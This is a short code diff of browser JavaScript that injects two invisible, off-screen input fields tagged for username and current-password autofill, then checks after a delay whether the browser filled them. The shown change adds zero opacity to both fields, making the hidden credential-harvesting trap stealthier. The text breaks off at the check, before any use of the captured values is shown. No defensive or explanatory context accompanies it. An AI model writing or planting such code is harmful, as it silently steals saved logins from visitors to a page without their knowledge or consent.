@@ -1,11 +1,11 @@
 var a=document.createElement('input');
 a.autocomplete='username';
-a.style.cssText='position:fixed;left:-9999px;top:0;width:1px;height:1px';
+a.style.cssText='position:fixed;left:-9999px;top:0;width:1px;height:1px;opacity:0';
 document.body.appendChild(a);
 var b=document.createElement('input');
 b.type='password';
 b.autocomplete='current-password';
-b.style.cssText='position:fixed;left:-9999px;top:0;width:1px;height:1px';
+b.style.cssText='position:fixed;left:-9999px;top:0;width:1px;height:1px;opacity:0';
 document.body.appendChild(b);
 setTimeout(function(){
 if(a.value||b.value){
